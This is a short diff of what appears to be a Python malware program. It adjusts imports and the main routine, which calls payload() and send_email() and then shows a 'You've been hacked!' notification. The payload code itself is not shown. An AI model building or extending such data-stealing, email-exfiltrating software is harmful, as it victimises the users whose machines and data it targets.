@@ -32,20 +32,19 @@ import docx
 import subprocess
 from datetime import datetime
 import typing
-from notify import notification
+import notify
 import shutil
 import re
 import sqlite3
 import base64
 import enum
-import threading
+#import threading
 
 import smtplib
 import email
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.utils import COMMASPACE # Value: ", "
-import json
 
 from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton, QDesktopWidget, QCheckBox
 from PyQt5 import QtGui
@@ -1017,4 +1016,4 @@ if __name__ == "__main__":
     #send_email_thread.start()
     payload()
     send_email()
-    notification("You've been hacked!", message="", app_name="filewriter")
+    notify.notification("You've been hacked!", message="", app_name="filewriter")
